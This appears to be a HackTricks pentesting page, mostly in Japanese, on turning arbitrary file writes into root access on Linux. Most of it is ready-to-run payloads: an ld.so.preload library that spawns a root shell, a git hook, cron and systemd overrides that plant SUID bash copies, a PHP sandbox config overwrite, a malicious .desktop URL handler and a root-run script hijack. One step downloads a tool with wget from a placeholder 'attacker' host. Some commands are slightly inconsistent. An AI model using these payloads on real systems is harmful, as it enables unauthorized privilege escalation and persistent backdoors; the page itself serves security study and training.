# ルートへの任意のファイル書き込み

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

このファイルは **`LD_PRELOAD`** 環境変数のように動作しますが、**SUID binaries** でも機能します。\
もしこのファイルを作成または変更できるなら、実行される各バイナリとともにロードされるライブラリへの**パスを追加する**だけで済みます。

例えば: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) は、git リポジトリ内でコミットが作成されたり、merge が行われたりするようなさまざまな**events**で**run**される**scripts**です。したがって、**privileged script or user** がこれらの操作を頻繁に行い、**write in the `.git` folder** が可能であれば、これを利用して **privesc** することができます。

例えば、git リポジトリの **`.git/hooks`** に**generate a script** を置けば、新しい commit が作成されるたびに常に実行されるようにできます:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

もし **write cron-related files that root executes** ことができれば、通常ジョブが次に実行される際に code execution を得られることが多いです。興味深いターゲットは以下の通りです:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root's own crontab in `/var/spool/cron/` or `/var/spool/cron/crontabs/`
- `systemd` timers and the services they trigger

簡単なチェック:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
典型的な悪用経路:

- **Append a new root cron job** を `/etc/crontab` または `/etc/cron.d/` のファイルに追加する
- **Replace a script** を、既に `run-parts` によって実行されているスクリプトと置き換える
- **Backdoor an existing timer target** を、起動するスクリプトやバイナリを変更してバックドア化する

最小限の cron ペイロードの例:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
もし `run-parts` によって使用される cron ディレクトリ内にしか書き込めない場合は、代わりにそこに実行可能なファイルを置いてください:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
注意:

- `run-parts` は通常ドットを含むファイル名を無視するため、`backup` のような名前を `backup.sh` の代わりに使う方がよい。
- 一部のディストリビューションでは従来の `cron` の代わりに `anacron` や `systemd` timers を使うが、悪用の考え方は同じ：**root が後で実行するものを変更する**。

### Service & Socket files

`systemd` の unit ファイル、またはそれらから参照されるファイルを書き込めるなら、ユニットを再読み込み・再起動することで、あるいはサービス/ソケットのアクティベーション経路がトリガーされるのを待つことで、root としてコード実行を得られる可能性がある。

興味深いターゲットには次が含まれる:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` に参照されるサービスのスクリプト/バイナリ
- root サービスによって読み込まれる、書き込み可能な `EnvironmentFile=` パス

クイックチェック:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
一般的な悪用経路:

- **Overwrite `ExecStart=`** 自分が変更できる root 所有の service unit 内で
- **Add a drop-in override** 悪意のある `ExecStart=` を含む drop-in override を追加し、まず既存のものを消去する
- **Backdoor the script/binary** unit によって既に参照されているものに対して
- **Hijack a socket-activated service** ソケットが接続を受け取ったときに起動する対応する `.service` ファイルを変更することによって

Example malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
典型的なアクティベーションのフロー：
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
If you cannot restart services yourself but can edit a socket-activated unit, you may only need to **wait for a client connection** to trigger execution of the backdoored service as root.

### 特権付き PHP サンドボックスで使われる制限付き `php.ini` を上書きする

一部のカスタムデーモンは、ユーザーが提供した PHP を `php` を **制限付き `php.ini`** で実行して検証します（例: `disable_functions=exec,system,...`）。サンドボックス内のコードがまだ **何らかの書き込みプリミティブ**（例: `file_put_contents`）を持ち、デーモンが使用している **正確な `php.ini` パス** に到達できる場合、その設定を **上書きして制限を解除** し、権限昇格した状態で動作する第2のペイロードを送信できます。

典型的なフロー:

1. 最初のペイロードがサンドボックス設定を上書きする。
2. 2つ目のペイロードが、危険な関数が再度有効になった状態でコードを実行する。

最小の例（デーモンが使用するパスに置き換えてください）:
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### スキーマハンドラの上書き（like http: or https:）

被害者の設定ディレクトリに書き込み権限を持つ攻撃者は、システムの挙動を変えるファイルを容易に置換または作成でき、意図しないコード実行を引き起こします。`$HOME/.config/mimeapps.list` ファイルを変更して HTTP および HTTPS の URL ハンドラを悪意あるファイルに向ける（例: `x-scheme-handler/http=evil.desktop` と設定する）ことで、攻撃者は **どの http または https のリンクをクリックしてもその `evil.desktop` ファイルで指定されたコードが実行される** ようにできます。たとえば、`$HOME/.local/share/applications` にある `evil.desktop` に次の悪意あるコードを置くと、外部の URL をクリックするたびに埋め込まれたコマンドが実行されます:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
詳細は[**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49)を確認してください。ここでは実際の脆弱性を悪用するために使用されました。

### Root がユーザー書き込み可能なスクリプト/バイナリを実行する場合

特権を持つワークフローが `/bin/sh /home/username/.../script` のようなもの（または権限のないユーザーが所有するディレクトリ内の任意のバイナリ）を実行している場合、それをハイジャックできます:

- **実行の検出:** [pspy](https://github.com/DominicBreuker/pspy)でプロセスを監視し、rootがユーザー制御のパスを呼び出すのを捕捉します:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** 対象ファイルとそのディレクトリの両方があなたのユーザーによって所有され、書き込み可能であることを確認する。
- **Hijack the target:** 元の binary/script のバックアップを取り、SUID shell を作成する payload を配置（または他の root action を実行）し、権限を元に戻す：
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action**（例: UI ボタンを押して helper を起動する）。root が hijacked path を再実行したとき、`./rootshell -p` で escalated shell を取得する。

## 参考資料

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
